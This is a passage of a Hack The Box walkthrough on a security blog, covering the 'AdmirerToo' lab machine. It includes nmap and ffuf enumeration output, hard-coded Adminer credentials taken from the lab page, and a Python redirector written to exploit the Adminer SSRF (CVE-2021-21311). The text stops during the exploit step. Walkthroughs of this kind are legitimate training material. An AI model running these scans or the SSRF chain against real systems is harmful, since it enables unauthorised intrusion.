<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	15 Jan 2022IP:	10.10.11.137">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack-The-Box-walkthrough[admirertoo]">
<meta property="og:url" content="https://fdlucifer.github.io/2022/01/23/admirertoo/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	15 Jan 2022IP:	10.10.11.137">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2130.jpg">
<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2131.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2132.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2133.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2134.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2135.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2136.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2137.jpg">
<meta property="article:published_time" content="2022-01-23T06:33:29.000Z">
<meta property="article:modified_time" content="2022-06-04T14:48:10.132Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="HackTheBox靶机练习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2130.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2022/01/23/admirertoo/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2022/01/23/admirertoo/","path":"2022/01/23/admirertoo/","title":"Hack-The-Box-walkthrough[admirertoo]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hack-The-Box-walkthrough[admirertoo] | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">42</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">206</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NMAP"><span class="nav-number">2.1.</span> <span class="nav-text">NMAP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-User"><span class="nav-number">2.2.</span> <span class="nav-text">Privilege Escalation - User</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">Step 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-2"><span class="nav-number">2.2.2.</span> <span class="nav-text">Step 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-3"><span class="nav-number">2.2.3.</span> <span class="nav-text">Step 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-4"><span class="nav-number">2.2.4.</span> <span class="nav-text">Step 4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-5"><span class="nav-number">2.2.5.</span> <span class="nav-text">Step 5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-6"><span class="nav-number">2.2.6.</span> <span class="nav-text">Step 6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-7"><span class="nav-number">2.2.7.</span> <span class="nav-text">Step 7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-8"><span class="nav-number">2.2.8.</span> <span class="nav-text">Step 8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-9"><span class="nav-number">2.2.9.</span> <span class="nav-text">Step 9</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">3.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Contact-me"><span class="nav-number">4.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">206</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2022/01/23/admirertoo/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Hack-The-Box-walkthrough[admirertoo] | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Hack-The-Box-walkthrough[admirertoo]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-01-23 14:33:29" itemprop="dateCreated datePublished" datetime="2022-01-23T14:33:29+08:00">2022-01-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-06-04 22:48:10" itemprop="dateModified" datetime="2022-06-04T22:48:10+08:00">2022-06-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>6.7k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>24 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h1><p>OS:	 Linux<br>Difficulty:	Hard<br>Points:	40<br>Release:	15 Jan 2022<br>IP:	10.10.11.137</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2130.jpg"></p>
</li>
<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
</li>
</ul>
<span id="more"></span>

<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">└─<span class="comment"># nmap -p- -sV -sC -v -oA enum_all --min-rate 4500 --max-rtt-timeout 1500ms 10.10.11.137</span></span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)</span><br><span class="line">|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)</span><br><span class="line">|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)</span><br><span class="line">80/tcp    open     http           Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-title: Admirer</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">4242/tcp  filtered vrml-multi-use</span><br><span class="line">16010/tcp filtered unknown</span><br><span class="line">16030/tcp filtered unknown</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p>Nmap reveals two open ports and three filtered ports. Most of the time we don’t see filtered ports on HTB boxes, but there is a possibility that we might have to use these ports for specific exploit. Based on SSH version information, it’s safe to assume that it is a Debian OS.</p>
<ul>
<li>Filtered Port: Nmap cannot determine whether the port is open because packet filtering (firewall) prevents its probes from reaching the port. The filtering could be from a dedicated firewall device, router rules, or host-based firewall software. These ports frustrate attackers because they provide so little information. Sometimes they respond with ICMP error messages such as type 3 code 13 (destination unreachable: communication administratively prohibited), but filters that simply drop probes without responding are far more common. This forces Nmap to retry several times just in case the probe was dropped due to network congestion rather than filtering. This slows down the scan dramatically.</li>
</ul>
<p>Let’s look in to the HTTP service.</p>
<p>There’s nothing much available on the webpage to begin with. Even after running Directory Brute Force on the page, there’s nothing interesting. However, if we hit any random page, which has 404 status code (not found). we will see generic error information.</p>
<p>If you check the source page of this 404, then we’d find a useful information.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;address&gt;Apache/2.4.38 (Debian) Server at &lt;a href=<span class="string">&quot;mailto:webmaster@admirer-gallery.htb&quot;</span>&gt;10.10.11.137&lt;/a&gt; Port 80&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>As you can see, we have a domain name, which is quite different than usual. Most of the time the domain of any HTB box is the name of the machine, but this time we have a different one. Add this to hosts file. Let’s look for any vhost on this machine.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/ffuf]</span><br><span class="line">└─<span class="comment"># ./ffuf -u http://admirer-gallery.htb -H &#x27;Host: FUZZ.admirer-gallery.htb&#x27; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4572</span></span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.1.0-git</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://admirer-gallery.htb</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.admirer-gallery.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span></span><br><span class="line"><span class="string"> :: Filter           : Response words: 4572</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">db                      [Status: 200, Size: 2511, Words: 108, Lines: 63]</span></span><br><span class="line"><span class="string">:: Progress: [4989/4989] :: Job [1/1] :: 166 req/sec :: Duration: [0:00:30] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>

<p>We got one available vhost. Let’s add that to hosts file and check the webpage.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.137    admirer-gallery.htb db.admirer-gallery.htb</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://db.admirer-gallery.htb/</span><br><span class="line"></span><br><span class="line">Adminer 4.7.8</span><br></pre></td></tr></table></figure>

<p>We have access to database via web. Let’s enter and look for any interesting tables. just hit enter, and we are in…</p>
<p>The interesting part of this is, it didn’t ask for any ‘password’ to access after clicking ‘enter’ button. There’s only one table and nothing really interesting in that. The reason it didn’t ask for any credentials is, it has hard-coded them in this page and by-default it post them once we click on ‘enter’ button.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;auth[driver]&quot;</span> value=<span class="string">&quot;server&quot;</span>&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;auth[server]&quot;</span> value=<span class="string">&quot;localhost&quot;</span>&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;auth[username]&quot;</span> value=<span class="string">&quot;admirer_ro&quot;</span>&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;auth[password]&quot;</span> value=<span class="string">&quot;1w4nn4b3adm1r3d2!&quot;</span>&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">&#x27;hidden&#x27;</span> name=<span class="string">&quot;auth[db]&quot;</span> value=<span class="string">&quot;admirer&quot;</span>/&gt;</span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">&#x27;hidden&#x27;</span> name=<span class="string">&quot;auth[permanent]&quot;</span> value=<span class="string">&quot;1&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>

<p>I tried to use that password to login via SSH, but it didn’t work. But, ‘Adminer 4.7.8’ is being used for this service. There’s a vulnerability that exists on this version.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlL0NWRS0yMDIxLTIxMzExLw==">CVE-2021-21311<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>Server-Side Request Forgery is possible to access an internal server&#x2F;service.</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2131.jpg"></p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Fkdmlzb3JpZXMvR0hTQS14NXIyLWhqNWMtOGp4Ng==">SSRF in adminer<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
<p>There’s a POC already available for this. Look into the PDF for POC. We need to setup a redirector on our Kali Linux machine.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L3BlbnRlc3Rpbmctd2ViL3NzcmYtc2VydmVyLXNpZGUtcmVxdWVzdC1mb3JnZXJ5">SSRF (Server Side Request Forgery)<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>We will use this below python code to do that.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#python3 ./redirector.py 8000 http://127.0.0.1/</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)-<span class="number">1</span> != <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: &#123;&#125; &lt;port_number&gt; &lt;url&gt;&quot;</span>.<span class="built_in">format</span>(sys.argv[<span class="number">0</span>]))</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Redirect</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        self.send_response(<span class="number">302</span>)</span><br><span class="line">        self.send_header(<span class="string">&#x27;Location&#x27;</span>, sys.argv[<span class="number">2</span>])</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line">HTTPServer((<span class="string">&quot;&quot;</span>, <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])), 